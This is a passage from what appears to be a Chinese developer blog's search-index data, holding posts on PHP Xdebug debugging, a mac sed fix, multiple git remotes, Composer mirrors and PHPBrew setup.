xdebug.remote_host setting to the IP address of your NAT machine, and configure the IDEs to connect to the proxy running at :9001. 大致解释一下： 你的路由器得从ISP处获取到公网IP 在你的路由器上运行 dbgpProxy 路由器下所有人的的 IDE 的 DBGp Proxy 配置 的 Host 填写路由器网关，即路由器内网地址 到这里，你可以发现，搭建 DBGp调试环境 非常苛刻，结合 公网IP 和 路由器运行 dbgpProxy 这两点看，只有 软路由 可以满足，因为 dbgpProxy 的二进制可执行文件只有 Windows / macOS / Linux x86-64 版本。所以大部分人/公司 可以洗洗睡了。 结语为了写这两篇文，笔者是翻来覆去做了很多实验，还整理了很多知识点，打了很多草稿（真正意义上的纸质草稿），最后附上最满意的一张草稿。 希望读者们能有所收获，感谢阅读！ 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"debug","slug":"debug","permalink":"https://blog.chaosjohn.com/tags/debug/"},{"name":"php","slug":"php","permalink":"https://blog.chaosjohn.com/tags/php/"},{"name":"xdebug","slug":"xdebug","permalink":"https://blog.chaosjohn.com/tags/xdebug/"}]},{"title":"解决 mac 上 sed 报错","slug":"GNU-sed-to-mac-sed","date":"2020-12-05T03:13:25.000Z","updated":"2020-12-05T04:42:01.107Z","comments":true,"path":"GNU-sed-to-mac-sed.html","link":"","permalink":"https://blog.chaosjohn.com/GNU-sed-to-mac-sed.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前言之前在每篇文前都标注了 原文链接，想着把它替换成 转载申明，手动一篇一篇替换是不可能的，咱可是程序员，任何批量操作都可以 脚本化 说干就干关于文本批处理工具，首先想到的就是 sed，它是一个“非交互式的”面向字符流的编辑器，能同时处理多个文件多行的内容，可以不对原文件改动，把整个文件输入到屏幕,可以把只匹配到模式的内容输入到屏幕上。还可以对原文件改动，但是不会再屏幕上返回结果。 上脚本： 123456$ for file in *.md; do sed -i &#39;s&#x2F;原文链接&#x2F;欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】&#x2F;g&#39; $file; donesed: 1: &quot;Clean-APFS-Snapshots.md&quot;: invalid command code Csed: 1: &quot;Comeback-in-2020.md&quot;: invalid command code Csed: 1: &quot;Crack-Bartender2.md&quot;: invalid command code Csed: 1: &quot;Debug-php.md&quot;: extra characters at the end of D command... 怎么回事，全都报错了？？？ 查找问题关于 sed，平时在生产环境中也用的挺多的，sed -i &#39;s/旧/新/g&#39; $&#123;FILE&#125; 语法肯定没错呀。唯一不同的在于生产环境都是 GNU/Linux，问题肯定出在了 macOS 上。用 man 指令查看一下 sed 在 两个平台的 帮助手册 -i 即替换后的新文本会直接回写进原文件： GNU sed 如果在 -i 后添加了 后缀，则会备份原文件；如果不添加，则不备份 mac sed 则强制性要添加 后缀。如果不想备份原文件，后缀置为空字符串 &#39;&#39; 解决原脚本修正为: 1$ for file in *.md; do sed -i &#39;&#39; &#39;s&#x2F;原文链接&#x2F;欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】&#x2F;g&#39; $file; done 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"OS X & macOS","slug":"OS-X-macOS","permalink":"https://blog.chaosjohn.com/tags/OS-X-macOS/"},{"name":"shell","slug":"shell","permalink":"https://blog.chaosjohn.com/tags/shell/"},{"name":"sed","slug":"sed","permalink":"https://blog.chaosjohn.com/tags/sed/"}]},{"title":"git 设置远端仓库","slug":"Git-set-remote","date":"2020-12-04T09:27:41.000Z","updated":"2020-12-05T02:23:29.957Z","comments":true,"path":"Git-set-remote.html","link":"","permalink":"https://blog.chaosjohn.com/Git-set-remote.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前段时间，公司开了一个新项目，买了另一家公司的源码做二次开发。 项目进行了几天后，我突然听到参与开发的几个同学在讨论，关于 “不想把我们修改的版本推给他们”。 我就顿感奇怪，买了源码还要遵循他们的开源协议？ 我跑过去问问怎么回事，一听就乐了。原来对方公司将代码部署在私有 git 服务器上，给了我们账号密码以供拉取源码。对方承诺对产品做后续的更新维护，新版本也发布在该 git 仓库上。但是我们对源码做二次开发，会进行很多改动，又不想把我们的改动推给他们。 啊这。。。明显是对 git 不熟悉啊，而且还不是一个同学，应该值得反省。平日里起草招聘需求时都会把 git 作为一个必备的技能项，结果轮到自己身上，却只略知皮毛。 我先代入他们的思维反过来推理：为什么一定要 push，他们的代码只做 pull，拉取新版合并到本地不就行了么。哦，原来不止一个小伙伴在协同开发，相互间要共享改动，比如 A同学 的改动 push 后 B同学 pull 后才能看到。那 push 后不就推送到了对方公司的 git 服务器了么。 所以小伙伴们还停留在一个 git 仓库只有一个远端的层面。 其实一个 git 仓库是可以配置多个远端 remote。 我们举个例子来模拟一下，我们从 github 上随便 clone 一个项目下来 12345678$ git clone git@github.com:taniarascia&#x2F;takenote.gitCloning into &#39;takenote&#39;...remote: Enumerating objects: 114, done.remote: Counting objects: 100% (114&#x2F;114), done.remote: Compressing objects: 100% (92&#x2F;92), done.remote: Total 4672 (delta 44), reused 50 (delta 20), pack-reused 4558Receiving objects: 100% (4672&#x2F;4672), 10.13 MiB | 780.00 KiB&#x2F;s, done.Resolving deltas: 100% (2990&#x2F;2990), done. 我们查看一下 git配置： 123456789101112131415$ cd takenote$ cat .git&#x2F;config[core] repositoryformatversion &#x3D; 0 filemode &#x3D; true bare &#x3D; false logallrefupdates &#x3D; true ignorecase &#x3D; true precomposeunicode &#x3D; true[remote &quot;origin&quot;] url &#x3D; git@github.com:taniarascia&#x2F;takenote.git fetch &#x3D; +refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;origin&#x2F;*[branch &quot;master&quot;] remote &#x3D; origin merge &#x3D; refs&#x2F;heads&#x2F;master 我们可以看到 只有一个 远端(remote) - origin，并且指向了 &#103;&#105;&#x74;&#64;&#x67;&#x69;&#116;&#104;&#x75;&#x62;&#46;&#x63;&#x6f;&#109;:taniarascia/takenote.git 只有一个 分支(master) 接下来去 码云Gitee 上去创建一个 空的 私有仓库，模拟存放我们的 已修改源码 创建后会跳转到仓库主页 我们可以看到，对于已存在的本地仓库，是可以直接推送到 码云 的 12git remote add origin git@gitee.com:ChaosJohn&#x2F;takenote.gitgit push -u origin master 解释一下第一行：添加一个 远端(remote)，取名为 origin，设置 远端地址 为 git@gitee.com:ChaosJohn/takenote.git 可以预见，如果直接执行，肯定会报错，先试试： 12$ git remote add origin git@gitee.com:ChaosJohn&#x2F;takenote.gitfatal: remote origin already exists. 报错提示说：名叫 origin 的远端已存在。 那咱就换一个呗，不如取名 gitee 吧，正好寓意这个远端是 码云 的，再次执行 git remote add gitee git@gitee.com:ChaosJohn/takenote.git 无报错。 查看一下配置文件，发现比之前的多了三行 1234567891011121314151617$ cat .git&#x2F;config[core] repositoryformatversion &#x3D; 0 filemode &#x3D; true bare &#x3D; false logallrefupdates &#x3D; true ignorecase &#x3D; true precomposeunicode &#x3D; true[remote &quot;origin&quot;] url &#x3D; git@github.com:taniarascia&#x2F;takenote.git fetch &#x3D; +refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;origin&#x2F;*[branch &quot;master&quot;] remote &#x3D; origin merge &#x3D; refs&#x2F;heads&#x2F;master[remote &quot;gitee&quot;] url &#x3D; git@gitee.com:ChaosJohn&#x2F;takenote.git fetch &#x3D; +refs&#x2F;heads&#x2F;*:refs&#x2F;remotes&#x2F;gitee&#x2F;* 其实直接将这三行添加到 .git/config 文件内，等同与执行 git remote add 命令。 所以正确的 git 工作流程为： 从当前 master 分支创建新的 开发分支 git checkout -b dev 在 dev 分支上做二次开发，提交并且推送到 码云远端 git push -u gitee dev 如果原项目出更新内容了，先切回到 master 分支，然后从 github远端 拉取新代码 git pull origin master 再将 master 分支合并到 dev 分支 切换到 dev 分支，继续做二次开发以及推送到码云，如此循环迭代 所以建议所有开发的小伙伴们，有时间要多去学习和熟悉 git。毕竟 工欲善其事 必先利其器 嘛！！！ 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://blog.chaosjohn.com/tags/git/"}]},{"title":"解决 Composer 报错 InvalidArgumentException","slug":"Fix-InvalidArgumentException-for-Composer","date":"2020-12-03T09:37:32.000Z","updated":"2020-12-05T02:23:29.942Z","comments":true,"path":"Fix-InvalidArgumentException-for-Composer.html","link":"","permalink":"https://blog.chaosjohn.com/Fix-InvalidArgumentException-for-Composer.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 composer 在 2020-11-24 发布了全新的 2.0 版本。参考官方博客 鉴于博客里描述新版在很多方面都做出了优化，特别是性能方面，提速了很多，于是笔者迫不及待地更新了。 但是在写上一篇文章 php 调试指南（Xdebug版）的篇头处，执行 composer require mikecao/flight 却发生了异常 1234567891011[RuntimeException]No composer.json present in the current directory, this may be the cause of the following exception.[InvalidArgumentException]Could not find package mikecao&#x2F;flight.Did you mean one of these? mikecao&#x2F;flight geogkary&#x2F;breeze 分析报错信息，提示找不到 mikecao/flight，又问我是不是想找 mikecao/flight。 这。。。有毒吧 会不会是 Composer 2.0 的 bug？不科学呀，不至于有这么大的bug还发布了出来。 会不会是我的配置有问题？查看一下 配置文件 12345678910$ cat ~&#x2F;.composer&#x2F;config.json&#123; &quot;config&quot;: &#123;&#125;, &quot;repositories&quot;: &#123; &quot;packagist&quot;: &#123; &quot;type&quot;: &quot;composer&quot;, &quot;url&quot;: &quot;https:&#x2F;&#x2F;packagist.phpcomposer.com&quot; &#125; &#125;&#125; 可以看到除了 镜像源 以外并无其他的配置。 问题会不会出在 镜像源 上呢，反正排除法就那么多选项 删除 镜像源 删除 composer 二进制文件以及程序目录 $HOME/.composer 后重装 将 config.json 的 packagist 块删除后（亦可执行 composer config -g --unset repos.packagist），再次执行 require 12345678910111213$ composer require mikecao&#x2F;flightUsing version ^1.3 for mikecao&#x2F;flight.&#x2F;composer.json has been updatedRunning composer update mikecao&#x2F;flightLoading composer repositories with package informationUpdating dependenciesLock file operations: 1 install, 0 updates, 0 removals - Locking mikecao&#x2F;flight (v1.3.8)Writing lock fileInstalling dependencies from lock file (including require-dev)Package operations: 1 install, 0 updates, 0 removals - Installing mikecao&#x2F;flight (v1.3.8): Extracting archiveGenerating autoload files Bingo! 异常报错消失了 可是该镜像源 Packagist / Composer 中国全量镜像 笔者已经使用了好多年了，怎么突然就挂了呢？网上也搜不到它的 停服 消息。 考虑到国内的网络环境，得重新找一个镜像源。 经过一番网罗，笔者最终敲定选用 阿里云 Composer 全量镜像，配置命令： 1$ composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F; 其他的推荐镜像源： 华为云 https://mirrors.huaweicloud.com/repository/php/ 次选镜像源： 腾讯云 https://mirrors.cloud.tencent.com/composer/ 上海交通大学 https://packagist.mirrors.sjtug.sjtu.edu.cn 列为次选是因为还未支持 Composer2，运行时会有 黄色警告 1Composer 2 repository support for https:&#x2F;&#x2F;mirrors.xxx.com&#x2F;composer has been disabled due to what seems like a misconfiguration. If this is a packagist.org mirror we recommend removing it as Composer 2 handles network operations much faster and should work fine without. 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"php","slug":"php","permalink":"https://blog.chaosjohn.com/tags/php/"},{"name":"fix","slug":"fix","permalink":"https://blog.chaosjohn.com/tags/fix/"},{"name":"composer","slug":"composer","permalink":"https://blog.chaosjohn.com/tags/composer/"}]},{"title":"php 调试指南（Xdebug版）","slug":"Debug-php","date":"2020-12-01T15:33:41.000Z","updated":"2020-12-06T17:37:00.131Z","comments":true,"path":"Debug-php.html","link":"","permalink":"https://blog.chaosjohn.com/Debug-php.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 （吃透本文，没有人将比你更懂 **Php Xdebug 调试**）（来自于几天后的打脸，请移步 php 调试指南（Xdebug版）（续）） 创建一个精简项目（命令行）创建项目，并且用 composer 安装一个笔者比较喜欢的 微框架，作为示例 123$ mkdir debug$ cd debug$ composer require mikecao&#x2F;flight 编写主程序 index.php 12345678910cat &gt;&gt; index.php &lt;&lt;EOF&lt;?phprequire &#39;vendor&#x2F;autoload.php&#39;;Flight::route(&#39;&#x2F;&#39;, function()&#123; echo &#39;hello world!&#39;;&#125;);Flight::start();EOF 用 php 内置服务器运行项目 12345$ php -S localhost:8080[Tue Dec 1 23:31:12 2020] PHP 7.4.13 Development Server (http:&#x2F;&#x2F;localhost:8080) started[Tue Dec 1 23:31:35 2020] [::1]:57780 Accepted[Tue Dec 1 23:31:35 2020] [::1]:57780 [200]: GET &#x2F;[Tue Dec 1 23:31:35 2020] [::1]:57780 Closing 上面输出的后三行，是在本机另一终端访问 http://localhost:8080 时打印的日志 12$ curl -L localhost:8080hello world! （使用 php 内置服务器运行项目，只是为了检测项目是否能完好运行；该内置服务器只能用于开发环境，不能用于生产环境） 转移开发至 PhpStorm 中JetBrains 公司出品的 PhpStorm 与其安装在此不做赘述。 在 PhpStorm 中打开项目 打开 偏好设置（mac下快捷键为 Command+, Win/Linux下快捷键为 Ctrl+Alt+s），左边侧边栏定位到 Languages &amp; Frameworks =&gt; PHP 在这里添加此前于 PHPBrew 中安装的 PHP 版本。参考前文 PHPBrew 使用指南（注意：请务必安装 xdebug 扩展：$phpbrew ext install xdebug，否则无法进行调试） 将刚刚添加上的 PHP 版本应用到当前项目 用 Nginx 运行项目安装与管理 无视系统环境 - 编译安装，不做赘述 macOS12$ brew install nginx$ brew services start&#x2F;stop&#x2F;restart nginx # 启动&#x2F;停止&#x2F;重启 nginx Debian / Ubuntu123$ sudo apt update$ sudo apt install nginx-full$ sudo systemctl start&#x2F;stop&#x2F;restart nginx # 启动&#x2F;停止&#x2F;重启 nginx RHEL / CentOS123$ sudo yum update$ sudo apt install nginx$ sudo systemctl start&#x2F;stop&#x2F;restart nginx # 启动&#x2F;停止&#x2F;重启 nginx 配置（本文以 macOS 下 Homebrew 版 Nginx 为例）启动 php-fpm（用 PHPBrew 安装 PHP 时需要包含 +fpm variant） 12$ phpbrew fpm startStarting php-fpm... 在项目根目录下创建 nginx.conf 作为 Nginx 的配置文件 1234567891011121314server &#123; server_name localhost; listen 8000; root &#x2F;Users&#x2F;chaos&#x2F;Work&#x2F;php&#x2F;demos&#x2F;debug; location &#x2F; &#123; try_files $uri $uri&#x2F; &#x2F;index.php; fastcgi_pass unix:&#x2F;Users&#x2F;chaos&#x2F;.phpbrew&#x2F;php&#x2F;7.4.13&#x2F;var&#x2F;run&#x2F;php-fpm.sock; fastcgi_index index.php; include fastcgi.conf; fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name; &#125;&#125; 将该配置文件 软链接 到 Nginx 配置目录下 /usr/local/etc/nginx/servers/ 1$ ln -sf &#x2F;Users&#x2F;chaos&#x2F;Work&#x2F;php&#x2F;demos&#x2F;debug&#x2F;nginx.conf &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;servers&#x2F;php-debug.conf 检查 nginx.conf 是否有错误 123$ nginx -tnginx: the configuration file &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;nginx.conf syntax is oknginx: configuration file &#x2F;usr&#x2F;local&#x2F;etc&#x2F;nginx&#x2F;nginx.conf test is successful 启动 Nginx 12$ brew services start nginx&#x3D;&#x3D;&gt; Successfully started &#96;nginx&#96; (label: homebrew.mxcl.nginx) 终端下 curl 访问 Nginx部署的服务，验证项目成功跑了起来 12$ curl -L localhost:8000hello world! Xdebug 调试大部分关于 Xdebug 的配置，在前面部分已经配置完毕，我们来验证一下是否配置成功PhpStorm 顶部菜单栏点击 Run，在下拉菜单中选中 Web Server Debug Validation，弹出窗口中点击底部的 Validate 按钮。 如果显示成功，则调试环境已经搭建完毕 如果显示出错，会给出排错信息 发现三处警告，按照排错信息排查，发现问题出在了 Xdebug 3.0.0 版本变动了非常多的地方，导致目前 PhpStorm 最新的稳定版 2020.2.4 对此兼容性欠缺。不过 2020.3 有望解决。 （该文写完发布的第二天（即 2020-12-02），PhpStorm 2020.3 已释出，新增对 PHP 8 和 Xdebug 3 的支持，参见文末。亏了亏了，写早了。） 所以笔者将 Xdebug 降级到了 2.X 版本：phpbrew ext install xdebug 2.9.8，再次点击 Validate 按钮，怎么还是一样的报错？ 这里我们查看 php-fpm 的信息 12345$ phpbrew fpm info...xdebug support &#x3D;&gt; enabledVersion &#x3D;&gt; 3.0.0... 所以需要重启一下 php-fpm，让其加载新的 Xdebug 模块 12345678$ phpbrew fpm restartStopping php-fpm...Starting php-fpm...$ phpbrew fpm info...xdebug support &#x3D;&gt; enabledVersion &#x3D;&gt; 2.9.8... 再次点击 Validate 按钮 依旧报错，不过这里就清晰很多了，照着提示，phpbrew config 直接调用编辑器打开 php.ini 文件，在尾部添加： 12[xdebug]xdebug.remote_enable&#x3D;1 待 phpbrew fpm restart 后再次点击 Validate 按钮，成功！ 这就可以愉快的调试部署在 Nginx 里的项目啦，这里我们点击工具栏的 监听按钮，开始监听连接请求 浏览器作为请求客户端进行调试为浏览器安装插件 Xdebug Helper for Firefox / 源码 Xdebug Helper for Chrome / 源码 这里笔者以 Chrome 浏览器为例，安装完后，右键 Xdebug Helper 图标点击 Options 打开选项页，选择 IDE key 为 PhpStorm 新开浏览器窗口，地址栏输入localhost:8000访问服务，页面会显示 **hello world!**。单击 Xdebug Helper 图标，点击 Debug，开启调试模式，至此，图标将会变成绿色（或者使用 Alt+Shift+X 快捷键快速开关 Debug 模式） 准备开始调试： 确保 PhpStorm 的 监听 按钮已激活 在 PhpStorm 中给需要调试的代码行打上断点 确保浏览器的 Xdebug Helper处于 Debug 模式，图标变为绿色 刷新浏览器页面，PhpStorm 监听到请求传入，同时浏览器请求处于 Pending 状态，挂起等待请求响应 在弹窗中选择完正确的 php 文件后，PhpStorm 就进入了调试模式，成功地停在了断点处，在这里可以查看当前的各项 变量 以及单步运行 点击调试窗口左侧的 Resume Program 按钮，程序从断点处恢复运行，至此，浏览器侧的请求收到了等待已久的响应，在窗口渲染出 hello world! 字样 命令行 或其他 请求客户端 发起调试在实际的纯接口开发场景中，除了类似 localhost:8000 的简单请求，还有诸多带有复杂参数的请求，以及各种 http method 的请求（GET / POST / PUT / HEAD / DELETE / OPTIONS），仅仅通过浏览器地址栏进行发起调试并不能胜任。 开发人品平时发起请求测试，一般都选用 命令行工具（例如 curl / httpie）或类似 Postman 这样的专业请求调试客户端。 通过查阅Xdebug 官方文档，得知，浏览器的插件开启 Debug 模式，仅仅是给当前session增加了一个 Cookie: XDEBUG_SESSION=PHPSTORM 那就简单了，以 curl 举例的三种方式： $ curl -H &quot;Cookie: XDEBUG_SESSION=PHPSTORM&quot; localhost:8000 $ curl --cookie XDEBUG_SESSION=PHPSTORM localhost:8000 $ curl -b XDEBUG_SESSION=PHPSTORM localhost:8000 Postman 也类似，不再赘述 至此，在 PhpStorm 调试部署在 Nginx 中的项目，杀青！ 提出疑问还记得前面有一张关于配置 php解释器 图么（重新搬运放在本段下方），里面明明配置了 Xdebug 的参数，而 Web Server Debug Validation 还是提示要去 php.ini 中添加 xdebug.remote_enable=1 JetBrains 肯定不会那么无聊，放置一个无用的配置项在这里。那这个配置项究竟对哪块地方生效呢？ PhpStorm 工具栏点击 Add Configuration，点击 + 号，选择 PHP Build-in Web Server，端口改为 8088 (或其他未被占用端口) 选择刚刚新建的 运行配置 php build-in server，点击右侧 绿色三角按钮，运行项目（同时确保 监听按钮 也已激活） 再次在命令行下执行： 1$ curl -H &quot;Cookie: XDEBUG_SESSION&#x3D;PHPSTORM&quot; localhost:8000 Bingo!!! PhpStorm 成功进入了调试状态并且停在了断点处！ 发散 1: 在 PhpStorm 调试 远程服务上文描述的都是调试本地环境，即服务部署在本地 Nginx，通过本地的 php-fpm 调用 php 解释器 进行请求分发处理，“加载”的是本地的 Xdebug（调试端口为默认的 9000），而同时 PhpStorm 也监听本地的 Xdebug 的 9000 端口进行拦截调试。 可往往更多的情况是，服务并不部署在本地，而在 远端服务器，这个时候得如何调试呢？ 接下来在 另一台主机(192.168.1.101) 上调试 本机(192.168.1.100) 的服务，来模拟现实开发中的 远程调试。 本机(192.168.1.100) 上在 php.ini 尾部添加 xdebug.remote_connect_back=1 另一台主机(192.168.1.101) 的 PhpStorm 点击工具栏上的 监听按钮 开启监听，并且在代码窗口设置断点 在 该主机(192.168.1.101) 的终端上执行 1$ curl -H &quot;Cookie: XDEBUG_SESSION&#x3D;PHPSTORM&quot; 192.168.1.100:8000 即可看到 PhpStorm 进入了调试模式并且顺利停在了断点处。 发散 2：在 VSCode 中调试 本地服务打开 VSCode，安装 PHP Debug 扩展 打开项目工程，点击左边栏的 Run，点击 Create a launch.json file，选择 PHP 环境 VSCode 将会自动创建两个配置： Listen for XDebug：这个配置就是类似 PhpStorm 中的 监听按钮 Launch currently open script：执行按照 php-cli 模式运行/调试 当前窗口的php脚本 选择 Listen for XDebug 并点击左侧的 绿色图标 开始运行监听，并且打上断点，命令行下执行 curl --cookie XDEBUG_SESSION=VSCODE localhost:8000，则能看到VSCode 成功进入了调试状态并且停在了断点处。 发散 3：在 VSCode 调试 远程服务与 发散 1 类似，在 另一台主机(192.168.1.101) 上： 确保 php.ini 已添加 xdebug.remote_connect_back=1 选择 Listen for XDebug 并点击左侧的 绿色图标 开始运行监听，并且打上断点 命令行下执行 curl --cookie XDEBUG_SESSION=VSCODE 192.168.1.100:8000 则能看到VSCode 成功进入了调试状态并且停在了断点处。 所以，在 VSCode 调试部署在 Nginx 中的服务（本地与远程），也顺利杀青！ 一些 思考 或 疑惑 Xdebug 的 IDE key（即使在 php.ini 中配置了 xdebug.idekey=xxx）在 远程调试 时并不起作用，调试请求时在 Cookie 中附加的 XDEBUG_SESSION 设置任意非空字符串都生效。是 Xdebug 的 bug 么？ 无论采用 PhpStorm 还是 VSCode 进行远程调试中，明明远程服务器的 Xdebug 调试端口（默认为9000）对外不可达（仅 localhost 可访问），但是 打上断点 开启监听 又能调试了呢？ 多人协同调试，参考 JetBrains 文档 Multiuser debugging via Xdebug proxies 使用 DBGp代理 2020-12-05 补充更新PhpStorm 2020.3 已发布发布日志 最后，如果该文对读者有些许帮助，考虑下给点捐助鼓励一下呗😊","categories":[],"tags":[{"name":"debug","slug":"debug","permalink":"https://blog.chaosjohn.com/tags/debug/"},{"name":"php","slug":"php","permalink":"https://blog.chaosjohn.com/tags/php/"},{"name":"xdebug","slug":"xdebug","permalink":"https://blog.chaosjohn.com/tags/xdebug/"}]},{"title":"PHPBrew 使用指南","slug":"Using-phpbrew","date":"2020-12-01T02:50:12.000Z","updated":"2020-12-05T02:23:30.009Z","comments":true,"path":"Using-phpbrew.html","link":"","permalink":"https://blog.chaosjohn.com/Using-phpbrew.html","excerpt":"","text":"欢迎转载，但请在开头或结尾注明原文出处【blog.chaosjohn.com】 前言咋一看，这个名字取得，肯定是跟 Homebrew 学的。既然 Homebrew 的定位是 macOS 上的 包管理器，那 PHPBrew 肯定也跟 包管理器 沾点边。没错，它可以用来 构建 和 安装 多个版本的 php 到用户主目录($HOME)下。 项目主页 抄一下 PHPBrew 的特性: 编译配置选项简化为variant，不用再过于担心搜寻路径 通过不同的variant(比如PDO, mysql, sqlite, debug等等)进行构建php 编译 apache 和 nginx 模块，并且按不同版本区分 构建和安装到用户主目录下，免去root权限 版本间易于切换，且与bash/zsh集成 自动特性检测 易于安装和启用 php扩展 到当前环境 支持安装多个版本的 php 到系统环境中 为 Homebrew 和 MacPorts 优化路径检测 环境需求 平台支持 Mac OS 10.5+ Ubuntu Debian RHEL / CentOS 依赖需求 PHP5.3+ bz2 curl gcc, binutils, autoconf, libxml, zlib, readline 各平台上的依赖安装请参考官方文档，这里笔者仅附上 Mac OS + Homebrew 和 Ubuntu 20.04的安装命令 Mac OS12$ xcode-select --install$ brew install autoconf pkg-config Ubuntu 20.0412$ sudo apt update$ sudo apt install build-essential libbz2-dev libreadline-dev libsqlite3-dev libssl-dev libxml2-dev php7.4-cli php7.4-bz2 pkg-config 安装下载 12$ curl -L -O https:&#x2F;&#x2F;github.com&#x2F;phpbrew&#x2F;phpbrew&#x2F;releases&#x2F;latest&#x2F;download&#x2F;phpbrew.phar$ chmod +x phpbrew.phar 安装到配置在 $PATH 环境变量里的bin目录，比如官方文档里的 /usr/local/bin（笔者用的是 $HOME/bin） 1sudo mv phpbrew.phar &#x2F;usr&#x2F;local&#x2F;bin&#x2F;phpbrew 设置初始化shell环境 1$ phpbrew init init 指令将会创建 $HOME/.phpbrew 目录 将下面一行加入 .bashrc 或者 .zshrc 1[[ -e ~&#x2F;.phpbrew&#x2F;bashrc ]] &amp;&amp; source ~&#x2F;.phpbrew&#x2F;bashrc 设置搜寻路径前缀设置默认的搜寻路径前缀，用于搜寻依赖库，可选项有 macports, homebrew, debian, ubuntu 或者 自定义路径 Homebrew用户1$ phpbrew lookup-prefix homebrew MacPorts用户1$ phpbrew lookup-prefix macports 基本用法列举已知的版本 12345678910$ phpbrew known&#x3D;&#x3D;&#x3D;&gt; Fetching release list...Downloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;8&amp;max&#x3D;100 via php streamDownloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;7&amp;max&#x3D;100 via php stream8.0: 8.0.0 ...7.4: 7.4.13, 7.4.12, 7.4.11, 7.4.10, 7.4.9, 7.4.8, 7.4.7, 7.4.6 ...7.3: 7.3.25, 7.3.24, 7.3.23, 7.3.22, 7.3.21, 7.3.20, 7.3.19, 7.3.18 ...7.2: 7.2.34, 7.2.33, 7.2.32, 7.2.31, 7.2.30, 7.2.29, 7.2.28, 7.2.27 ...7.1: 7.1.33, 7.1.32, 7.1.31, 7.1.30, 7.1.29, 7.1.28, 7.1.27, 7.1.26 ...7.0: 7.0.33, 7.0.32, 7.0.31, 7.0.30, 7.0.29, 7.0.28, 7.0.27 ... 想看到更多小版本 12345678910111213141516$ phpbrew known --moreRead local release list (last update: 2020-12-01 03:46:52 UTC).You can run &#96;phpbrew update&#96; or &#96;phpbrew known --update&#96; to get a newer release list.8.0: 8.0.07.4: 7.4.13, 7.4.12, 7.4.11, 7.4.10, 7.4.9, 7.4.8, 7.4.7, 7.4.6, 7.4.5, 7.4.4, 7.4.3, 7.4.2, 7.4.1, 7.4.07.3: 7.3.25, 7.3.24, 7.3.23, 7.3.22, 7.3.21, 7.3.20, 7.3.19, 7.3.18, 7.3.17, 7.3.16, 7.3.15, 7.3.14, 7.3.13, 7.3.12, 7.3.11, 7.3.10, 7.3.9, 7.3.8, 7.3.7, 7.3.6, 7.3.5, 7.3.4, 7.3.3, 7.3.2, 7.3.1, 7.3.07.2: 7.2.34, 7.2.33, 7.2.32, 7.2.31, 7.2.30, 7.2.29, 7.2.28, 7.2.27, 7.2.26, 7.2.25, 7.2.24, 7.2.23, 7.2.22, 7.2.21, 7.2.20, 7.2.19, 7.2.18, 7.2.17, 7.2.16, 7.2.15, 7.2.14, 7.2.13, 7.2.12, 7.2.11, 7.2.10, 7.2.9, 7.2.8, 7.2.7, 7.2.6, 7.2.5, 7.2.4, 7.2.3, 7.2.27.1: 7.1.33, 7.1.32, 7.1.31, 7.1.30, 7.1.29, 7.1.28, 7.1.27, 7.1.26, 7.1.25, 7.1.24, 7.1.23, 7.1.22, 7.1.21, 7.1.20, 7.1.19, 7.1.18, 7.1.17, 7.1.16, 7.1.15, 7.1.147.0: 7.0.33, 7.0.32, 7.0.31, 7.0.30, 7.0.29, 7.0.28, 7.0.27 更新最新版本发行列表 1234567891011$ phpbrew update&#x3D;&#x3D;&#x3D;&gt; Fetching release list...Downloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;8&amp;max&#x3D;100 via php streamDownloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;7&amp;max&#x3D;100 via php stream8.0: 1 releases7.4: 14 releases7.3: 26 releases7.2: 33 releases7.1: 20 releases7.0: 7 releases&#x3D;&#x3D;&#x3D;&gt; Done 获取小于7.0的老版本（官方文档已滞后，还仅仅只把 小于5.4 作为老版本） 注意：不保证能成功构建这些不被PHPBrew官方支持的版本 1$ phpbrew update --old 列举小于7.0的老版本 12345678910111213141516171819$ phpbrew known --old&#x3D;&#x3D;&#x3D;&gt; Fetching release list...Downloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;8&amp;max&#x3D;100 via curl extensionDownloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;7&amp;max&#x3D;100 via curl extensionDownloading https:&#x2F;&#x2F;www.php.net&#x2F;releases&#x2F;index.php?json&#x3D;1&amp;version&#x3D;5&amp;max&#x3D;1000 via curl extension8.0: 8.0.0 ...7.4: 7.4.13, 7.4.12, 7.4.11, 7.4.10, 7.4.9, 7.4.8, 7.4.7, 7.4.6 ...7.3: 7.3.25, 7.3.24, 7.3.23, 7.3.22, 7.3.21, 7.3.20, 7.3.19, 7.3.18 ...7.2: 7.2.34, 7.2.33, 7.2.32, 7.2.31, 7.2.30, 7.2.29, 7.2.28, 7.2.27 ...7.1: 7.1.33, 7.1.32, 7.1.31, 7.1.30, 7.1.29, 7.1.28, 7.1.27, 7.1.26 ...7.0: 7.0.33, 7.0.32, 7.0.31, 7.0.30, 7.0.29, 7.0.28, 7.0.27 ...5.6: 5.6.40, 